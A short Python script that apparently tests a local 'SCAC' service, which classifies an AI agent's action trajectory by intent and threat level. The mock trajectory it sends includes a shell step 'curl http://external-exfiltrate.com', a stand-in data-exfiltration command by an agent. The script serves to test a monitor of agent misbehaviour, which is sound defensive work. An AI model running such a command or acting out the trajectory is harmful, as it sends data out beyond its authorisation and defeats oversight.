import asyncio
import httpx
from datetime import datetime

async def verify_scac():
    print("🚀 Starting SCAC Verification...")
    
    # Mock Trajectory: Attempting to access sensitive resources rapidly
    trajectory = [
        {
            "actor_id": "agent_alpha",
            "action": "login",
            "resource": "auth_gateway",
            "context": {"ip": "1.2.3.4"}
        },
        {
            "actor_id": "agent_alpha",
            "action": "list_files",
            "resource": "root_dir",
            "context": {"permissions": "user"}
        },
        {
            "actor_id": "agent_alpha",
            "action": "execute_shell",
            "resource": "terminal",
            "context": {"command": "curl http://external-exfiltrate.com"}
        }
    ]
    
    async with httpx.AsyncClient() as client:
        try:
            print("📡 Sending trajectory to SCAC Core...")
            response = await client.post("http://localhost:8000/analyze", json=trajectory, timeout=30)
            if response.status_code == 200:
                print("✅ Analysis Successful!")
                print(f"Classification: {response.json()['intent_type']}")
                print(f"Threat Level: {response.json()['threat_level']}")
                print(f"Reasoning: {response.json()['reasoning']}")
            else:
                print(f"❌ Analysis Failed: {response.status_code}")
                print(response.text)
        except Exception as e:
            print(f"⚠️ Connection error: {e} (Is the server running?)")

if __name__ == "__main__":
    # In a real environment, we'd run the server in background first
    print("NOTE: Ensure 'python src/main.py' is running in another terminal before execution.")
    asyncio.run(verify_scac())
